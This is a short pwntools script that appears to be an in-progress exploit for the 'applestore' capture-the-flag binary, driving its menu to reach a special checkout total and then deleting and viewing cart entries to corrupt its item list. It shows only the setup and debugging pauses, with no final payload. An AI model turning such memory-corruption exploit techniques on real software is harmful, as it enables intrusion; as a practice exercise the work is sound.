from pwn import *

io = process('./applestore')
context.terminal = ['tmux']

def add(product):
	print(io.recvuntil('> '))
	io.sendline('2')
	print(io.recvuntil('> '))
	io.sendline(str(product))

def checkout():
	print(io.recvuntil('> '))
	io.sendline('5')
	print(io.recvuntil('> '))
	io.sendline('y')

def cart():
	print(io.recvuntil('> '))
	io.sendline('4')
	print(io.recvuntil('> '))
	io.sendline('y')

def delete(product):
	print(io.recvuntil('> '))
	io.sendline('3')
	print(io.recvuntil('> '))
	io.sendline(str(product))

'''
for i in range(36):
	for j in range(36):
		for k in range(36):
			for l in range(36):
				for m in range(36):
					a = i*0xc7 + j*0x12b + k*0x1f3 + l*0x18f + m*0xc7
					if (a == 7174):
						print('prod 1:', i)
						print('prod 2:', j)
						print('prod 3:', k)
						print('prod 4:', l)
						print('prod 5:', m)
						print('total: ', a)
						pause()
'''


for i in range(10):
	add(4)
for j in range(16):
	add(5)


checkout()



delete(27)

delete(26)

pause()

add(2)

cart()


print(io.recvall())
